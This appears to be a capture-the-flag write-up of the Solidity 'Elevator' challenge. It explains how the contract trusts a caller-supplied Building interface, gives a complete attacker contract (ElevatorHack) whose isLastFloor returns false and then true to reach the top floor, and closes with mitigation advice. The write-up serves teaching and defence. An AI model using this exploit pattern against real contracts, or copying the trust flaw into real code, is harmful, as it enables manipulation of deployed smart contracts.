# Elevator Contract Vulnerability and Mitigation in Solidity

The main problem with the Elevator contract lies in its reliance on an external contract, `Building`, to determine whether the current floor is the last floor using the `isLastFloor` function. Specifically, the vulnerability arises from the fact that the Elevator contract trusts the `Building` interface implementation provided by `msg.sender`.

Here's the problematic code:

```solidity
Building building = Building(msg.sender);

if (! building.isLastFloor(_floor)) {
  floor = _floor;
  top = building.isLastFloor(floor);
}
```

An attacker can make a harmful contract using the Building interface and tamper with the isLastFloor function to take advantage of the Elevator contract. This occurs because the Elevator contract doesn't set restrictions on how isLastFloor is implemented.

contract ElevatorHack {
Elevator private immutable target;
uint private countCalls;

```solidity
    constructor(address _target) {
        target = Elevator(_target);
    }

    function attack() external {
        target.goTo(1);
        require(target.top(), "is not top floor");
    }

    function isLastFloor(uint) external returns (bool) {
        countCalls++;
        return countCalls > 1;
    }
```

}

The attacker's contract can alter the isLastFloor function's return value or use other methods to trick the Elevator contract, enabling the attacker to reach the top floor.

To address this problem, the Elevator contract should not depend on external contracts for crucial functions like isLastFloor. Instead, it should have built-in logic to check if a floor is the last one or use strict validation and access control to allow only trusted contracts to interact with it.
